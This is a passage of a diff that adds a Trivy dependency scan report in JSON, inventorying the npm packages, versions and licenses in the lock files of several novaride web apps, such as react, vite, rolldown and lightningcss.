@@ -1,0 +1,3744 @@
+{
+  "SchemaVersion": 2,
+  "Trivy": {
+    "Version": "0.69.3"
+  },
+  "ReportID": "019faf32-ce00-777d-b845-e97f83868be7",
+  "CreatedAt": "2026-07-29T18:46:10.176493263Z",
+  "ArtifactName": "/scan",
+  "ArtifactType": "filesystem",
+  "Results": [
+    {
+      "Target": "apps/novaride-admin/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "react@18.2.0",
+          "Name": "react",
+          "Identifier": {
+            "PURL": "pkg:npm/react@18.2.0",
+            "UID": "b3896030493dbac4"
+          },
+          "Version": "18.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1568,
+              "EndLine": 1579
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-dom@18.2.0",
+          "Name": "react-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/react-dom@18.2.0",
+            "UID": "b0d5a1fcc8f8dd36"
+          },
+          "Version": "18.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0",
+            "react@18.2.0",
+            "scheduler@0.23.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1580,
+              "EndLine": 1592
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "js-tokens@4.0.0",
+          "Name": "js-tokens",
+          "Identifier": {
+            "PURL": "pkg:npm/js-tokens@4.0.0",
+            "UID": "2f40ea25330fa02e"
+          },
+          "Version": "4.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1432,
+              "EndLine": 1437
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "loose-envify@1.4.0",
+          "Name": "loose-envify",
+          "Identifier": {
+            "PURL": "pkg:npm/loose-envify@1.4.0",
+            "UID": "8aed41d16171871b"
+          },
+          "Version": "1.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "js-tokens@4.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1464,
+              "EndLine": 1475
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "scheduler@0.23.2",
+          "Name": "scheduler",
+          "Identifier": {
+            "PURL": "pkg:npm/scheduler@0.23.2",
+            "UID": "31135bbb134e8e9a"
+          },
+          "Version": "0.23.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1684,
+              "EndLine": 1692
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ]
+    },
+    {
+      "Target": "apps/novaride-corporate/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "react@18.2.0",
+          "Name": "react",
+          "Identifier": {
+            "PURL": "pkg:npm/react@18.2.0",
+            "UID": "932864262f0a336"
+          },
+          "Version": "18.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1568,
+              "EndLine": 1579
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-dom@18.2.0",
+          "Name": "react-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/react-dom@18.2.0",
+            "UID": "e153a8613847dd80"
+          },
+          "Version": "18.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0",
+            "react@18.2.0",
+            "scheduler@0.23.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1580,
+              "EndLine": 1592
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "js-tokens@4.0.0",
+          "Name": "js-tokens",
+          "Identifier": {
+            "PURL": "pkg:npm/js-tokens@4.0.0",
+            "UID": "e4b8de94a4e34700"
+          },
+          "Version": "4.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1432,
+              "EndLine": 1437
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "loose-envify@1.4.0",
+          "Name": "loose-envify",
+          "Identifier": {
+            "PURL": "pkg:npm/loose-envify@1.4.0",
+            "UID": "b7bdc5ad7f5f63b1"
+          },
+          "Version": "1.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "js-tokens@4.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1464,
+              "EndLine": 1475
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "scheduler@0.23.2",
+          "Name": "scheduler",
+          "Identifier": {
+            "PURL": "pkg:npm/scheduler@0.23.2",
+            "UID": "6d12533d8469abd4"
+          },
+          "Version": "0.23.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1684,
+              "EndLine": 1692
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ]
+    },
+    {
+      "Target": "apps/novaride-fraud-center/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "react@18.2.0",
+          "Name": "react",
+          "Identifier": {
+            "PURL": "pkg:npm/react@18.2.0",
+            "UID": "e4293cbd738a775b"
+          },
+          "Version": "18.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1568,
+              "EndLine": 1579
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-dom@18.2.0",
+          "Name": "react-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/react-dom@18.2.0",
+            "UID": "741fce8c479873ad"
+          },
+          "Version": "18.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0",
+            "react@18.2.0",
+            "scheduler@0.23.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1580,
+              "EndLine": 1592
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "js-tokens@4.0.0",
+          "Name": "js-tokens",
+          "Identifier": {
+            "PURL": "pkg:npm/js-tokens@4.0.0",
+            "UID": "16b970fd847df9f9"
+          },
+          "Version": "4.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 1432,
+              "EndLine": 1437
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "loose-envify@1.4.0",
+          "Name": "loose-envify",
+          "Identifier": {
+            "PURL": "pkg:npm/loose-envify@1.4.0",
+            "UID": "843c1af329f9bdf8"
+          },
+          "Version": "1.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "js-tokens@4.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1464,
+              "EndLine": 1475
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "scheduler@0.23.2",
+          "Name": "scheduler",
+          "Identifier": {
+            "PURL": "pkg:npm/scheduler@0.23.2",
+            "UID": "af6e435915ddd41"
+          },
+          "Version": "0.23.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 1684,
+              "EndLine": 1692
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ]
+    },
+    {
+      "Target": "apps/novaride-operations/package-lock.json",
+      "Class": "lang-pkgs",
+      "Type": "npm",
+      "Packages": [
+        {
+          "ID": "@vitejs/plugin-react@6.0.3",
+          "Name": "@vitejs/plugin-react",
+          "Identifier": {
+            "PURL": "pkg:npm/%40vitejs/plugin-react@6.0.3",
+            "UID": "f03c395d8722c14c"
+          },
+          "Version": "6.0.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "@rolldown/pluginutils@1.0.1",
+            "vite@8.1.5"
+          ],
+          "Locations": [
+            {
+              "StartLine": 397,
+              "EndLine": 421
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react@18.2.0",
+          "Name": "react",
+          "Identifier": {
+            "PURL": "pkg:npm/react@18.2.0",
+            "UID": "415dcc49c4a71e3"
+          },
+          "Version": "18.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 857,
+              "EndLine": 868
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "react-dom@18.2.0",
+          "Name": "react-dom",
+          "Identifier": {
+            "PURL": "pkg:npm/react-dom@18.2.0",
+            "UID": "a5204994bca3d0c2"
+          },
+          "Version": "18.2.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "loose-envify@1.4.0",
+            "react@18.2.0",
+            "scheduler@0.23.2"
+          ],
+          "Locations": [
+            {
+              "StartLine": 869,
+              "EndLine": 881
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "typescript@5.9.3",
+          "Name": "typescript",
+          "Identifier": {
+            "PURL": "pkg:npm/typescript@5.9.3",
+            "UID": "8f30a10b651b913f"
+          },
+          "Version": "5.9.3",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Relationship": "direct",
+          "Locations": [
+            {
+              "StartLine": 956,
+              "EndLine": 968
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "vite@8.1.5",
+          "Name": "vite",
+          "Identifier": {
+            "PURL": "pkg:npm/vite@8.1.5",
+            "UID": "e5a08a05c2aced56"
+          },
+          "Version": "8.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "fsevents@2.3.3",
+            "lightningcss@1.32.0",
+            "picomatch@4.0.5",
+            "postcss@8.5.19",
+            "rolldown@1.1.5",
+            "tinyglobby@0.2.17"
+          ],
+          "Locations": [
+            {
+              "StartLine": 969,
+              "EndLine": 1045
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@emnapi/core@1.11.1",
+          "Name": "@emnapi/core",
+          "Identifier": {
+            "PURL": "pkg:npm/%40emnapi/core@1.11.1",
+            "UID": "60601c44559017dd"
+          },
+          "Version": "1.11.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@emnapi/wasi-threads@1.2.2",
+            "tslib@2.8.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 37,
+              "EndLine": 47
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@emnapi/runtime@1.11.1",
+          "Name": "@emnapi/runtime",
+          "Identifier": {
+            "PURL": "pkg:npm/%40emnapi/runtime@1.11.1",
+            "UID": "14d2f98a4581b971"
+          },
+          "Version": "1.11.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "tslib@2.8.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 48,
+              "EndLine": 57
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@emnapi/wasi-threads@1.2.2",
+          "Name": "@emnapi/wasi-threads",
+          "Identifier": {
+            "PURL": "pkg:npm/%40emnapi/wasi-threads@1.2.2",
+            "UID": "9824f39897ff602d"
+          },
+          "Version": "1.2.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "tslib@2.8.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 58,
+              "EndLine": 67
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@napi-rs/wasm-runtime@1.1.6",
+          "Name": "@napi-rs/wasm-runtime",
+          "Identifier": {
+            "PURL": "pkg:npm/%40napi-rs/wasm-runtime@1.1.6",
+            "UID": "dc5af8e030a3b364"
+          },
+          "Version": "1.1.6",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@emnapi/core@1.11.1",
+            "@emnapi/runtime@1.11.1",
+            "@tybys/wasm-util@0.10.3"
+          ],
+          "Locations": [
+            {
+              "StartLine": 68,
+              "EndLine": 85
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@oxc-project/types@0.139.0",
+          "Name": "@oxc-project/types",
+          "Identifier": {
+            "PURL": "pkg:npm/%40oxc-project/types@0.139.0",
+            "UID": "65ade6b5e18f1af2"
+          },
+          "Version": "0.139.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 86,
+              "EndLine": 94
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-android-arm64@1.1.5",
+          "Name": "@rolldown/binding-android-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-android-arm64@1.1.5",
+            "UID": "b55f20109026c877"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 111,
+              "EndLine": 126
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-darwin-arm64@1.1.5",
+          "Name": "@rolldown/binding-darwin-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-darwin-arm64@1.1.5",
+            "UID": "1551c2f9e79f10da"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 127,
+              "EndLine": 142
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-darwin-x64@1.1.5",
+          "Name": "@rolldown/binding-darwin-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-darwin-x64@1.1.5",
+            "UID": "4edf40deea0435c0"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 143,
+              "EndLine": 158
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-freebsd-x64@1.1.5",
+          "Name": "@rolldown/binding-freebsd-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-freebsd-x64@1.1.5",
+            "UID": "e987a9bab902525"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 159,
+              "EndLine": 174
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-linux-arm-gnueabihf@1.1.5",
+          "Name": "@rolldown/binding-linux-arm-gnueabihf",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-linux-arm-gnueabihf@1.1.5",
+            "UID": "cd0f87724cf213c6"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 175,
+              "EndLine": 190
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-linux-arm64-gnu@1.1.5",
+          "Name": "@rolldown/binding-linux-arm64-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-linux-arm64-gnu@1.1.5",
+            "UID": "4c34f84c29372b74"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 191,
+              "EndLine": 206
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-linux-arm64-musl@1.1.5",
+          "Name": "@rolldown/binding-linux-arm64-musl",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-linux-arm64-musl@1.1.5",
+            "UID": "8eceb8e130a56e9d"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 207,
+              "EndLine": 222
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-linux-ppc64-gnu@1.1.5",
+          "Name": "@rolldown/binding-linux-ppc64-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-linux-ppc64-gnu@1.1.5",
+            "UID": "5546c5808450d34a"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 223,
+              "EndLine": 238
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-linux-s390x-gnu@1.1.5",
+          "Name": "@rolldown/binding-linux-s390x-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-linux-s390x-gnu@1.1.5",
+            "UID": "beebce82ed82b7e5"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 239,
+              "EndLine": 254
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-linux-x64-gnu@1.1.5",
+          "Name": "@rolldown/binding-linux-x64-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-linux-x64-gnu@1.1.5",
+            "UID": "eca709b023cc5206"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 255,
+              "EndLine": 270
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-linux-x64-musl@1.1.5",
+          "Name": "@rolldown/binding-linux-x64-musl",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-linux-x64-musl@1.1.5",
+            "UID": "8525d9e6b3822ed"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 271,
+              "EndLine": 286
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-openharmony-arm64@1.1.5",
+          "Name": "@rolldown/binding-openharmony-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-openharmony-arm64@1.1.5",
+            "UID": "fdef763b4b7fc867"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 287,
+              "EndLine": 302
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-wasm32-wasi@1.1.5",
+          "Name": "@rolldown/binding-wasm32-wasi",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-wasm32-wasi@1.1.5",
+            "UID": "493462e84829a481"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@emnapi/core@1.11.1",
+            "@emnapi/runtime@1.11.1",
+            "@napi-rs/wasm-runtime@1.1.6"
+          ],
+          "Locations": [
+            {
+              "StartLine": 303,
+              "EndLine": 320
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-win32-arm64-msvc@1.1.5",
+          "Name": "@rolldown/binding-win32-arm64-msvc",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-win32-arm64-msvc@1.1.5",
+            "UID": "ce75f024e4d46fff"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 321,
+              "EndLine": 336
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/binding-win32-x64-msvc@1.1.5",
+          "Name": "@rolldown/binding-win32-x64-msvc",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/binding-win32-x64-msvc@1.1.5",
+            "UID": "a8e4edb740a332f2"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 337,
+              "EndLine": 352
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@rolldown/pluginutils@1.0.1",
+          "Name": "@rolldown/pluginutils",
+          "Identifier": {
+            "PURL": "pkg:npm/%40rolldown/pluginutils@1.0.1",
+            "UID": "6579606c0a346897"
+          },
+          "Version": "1.0.1",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 353,
+              "EndLine": 358
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "@tybys/wasm-util@0.10.3",
+          "Name": "@tybys/wasm-util",
+          "Identifier": {
+            "PURL": "pkg:npm/%40tybys/wasm-util@0.10.3",
+            "UID": "fc4b15b6803dc605"
+          },
+          "Version": "0.10.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "tslib@2.8.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 359,
+              "EndLine": 368
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "detect-libc@2.1.2",
+          "Name": "detect-libc",
+          "Identifier": {
+            "PURL": "pkg:npm/detect-libc@2.1.2",
+            "UID": "1240d2a31473d4b9"
+          },
+          "Version": "2.1.2",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 439,
+              "EndLine": 447
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "fdir@6.5.0",
+          "Name": "fdir",
+          "Identifier": {
+            "PURL": "pkg:npm/fdir@6.5.0",
+            "UID": "2688ff071b30d11"
+          },
+          "Version": "6.5.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "picomatch@4.0.5"
+          ],
+          "Locations": [
+            {
+              "StartLine": 448,
+              "EndLine": 464
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "fsevents@2.3.3",
+          "Name": "fsevents",
+          "Identifier": {
+            "PURL": "pkg:npm/fsevents@2.3.3",
+            "UID": "36c04b96f9e5b17e"
+          },
+          "Version": "2.3.3",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 465,
+              "EndLine": 478
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "js-tokens@4.0.0",
+          "Name": "js-tokens",
+          "Identifier": {
+            "PURL": "pkg:npm/js-tokens@4.0.0",
+            "UID": "138689d89433a33a"
+          },
+          "Version": "4.0.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 479,
+              "EndLine": 484
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss@1.32.0",
+          "Name": "lightningcss",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss@1.32.0",
+            "UID": "6153a9d09622487c"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "detect-libc@2.1.2",
+            "lightningcss-android-arm64@1.32.0",
+            "lightningcss-darwin-arm64@1.32.0",
+            "lightningcss-darwin-x64@1.32.0",
+            "lightningcss-freebsd-x64@1.32.0",
+            "lightningcss-linux-arm-gnueabihf@1.32.0",
+            "lightningcss-linux-arm64-gnu@1.32.0",
+            "lightningcss-linux-arm64-musl@1.32.0",
+            "lightningcss-linux-x64-gnu@1.32.0",
+            "lightningcss-linux-x64-musl@1.32.0",
+            "lightningcss-win32-arm64-msvc@1.32.0",
+            "lightningcss-win32-x64-msvc@1.32.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 485,
+              "EndLine": 513
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-android-arm64@1.32.0",
+          "Name": "lightningcss-android-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-android-arm64@1.32.0",
+            "UID": "23c0f1bc4e99499c"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 514,
+              "EndLine": 533
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-darwin-arm64@1.32.0",
+          "Name": "lightningcss-darwin-arm64",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-darwin-arm64@1.32.0",
+            "UID": "4e92a26497657a76"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 534,
+              "EndLine": 553
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-darwin-x64@1.32.0",
+          "Name": "lightningcss-darwin-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-darwin-x64@1.32.0",
+            "UID": "5fc34a705c1ecace"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 554,
+              "EndLine": 573
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-freebsd-x64@1.32.0",
+          "Name": "lightningcss-freebsd-x64",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-freebsd-x64@1.32.0",
+            "UID": "23550afbecd2fc1b"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 574,
+              "EndLine": 593
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-linux-arm-gnueabihf@1.32.0",
+          "Name": "lightningcss-linux-arm-gnueabihf",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-linux-arm-gnueabihf@1.32.0",
+            "UID": "dee112eb684c8e72"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 594,
+              "EndLine": 613
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-linux-arm64-gnu@1.32.0",
+          "Name": "lightningcss-linux-arm64-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-linux-arm64-gnu@1.32.0",
+            "UID": "6b11202a2cc9434d"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 614,
+              "EndLine": 633
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-linux-arm64-musl@1.32.0",
+          "Name": "lightningcss-linux-arm64-musl",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-linux-arm64-musl@1.32.0",
+            "UID": "e4561b1074e777a1"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 634,
+              "EndLine": 653
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-linux-x64-gnu@1.32.0",
+          "Name": "lightningcss-linux-x64-gnu",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-linux-x64-gnu@1.32.0",
+            "UID": "b5165f9f5edee162"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
